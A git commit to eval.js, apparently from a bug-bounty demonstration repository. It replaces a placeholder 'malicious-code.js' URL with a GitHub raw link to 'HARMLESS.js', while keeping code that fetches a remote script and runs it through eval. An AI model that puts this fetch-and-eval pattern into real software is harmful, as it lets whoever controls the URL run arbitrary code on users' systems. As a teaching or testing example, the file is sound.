0f9b7f9818dc7002f81d8801cc378cef7dca382a
rquinnb <89413994+rquinnb@users.noreply.github.com>
2024-08-21 00:51:28 -0500

    Update eval.js

--- eval.js
+++ eval.js
@@ -6,7 +6,7 @@ const code = 'console.log("Eval is executing this code")';
 eval(code);
 
 // Example of dynamically loading and executing code (potentially dangerous)
-const scriptUrl = 'https://example.com/malicious-code.js';
+const scriptUrl = 'https://raw.githubusercontent.com/rquinnb/BugBounties/main/HARMLESS.js';
 fetch(scriptUrl)
   .then(response => response.text())
   .then(code => eval(code));
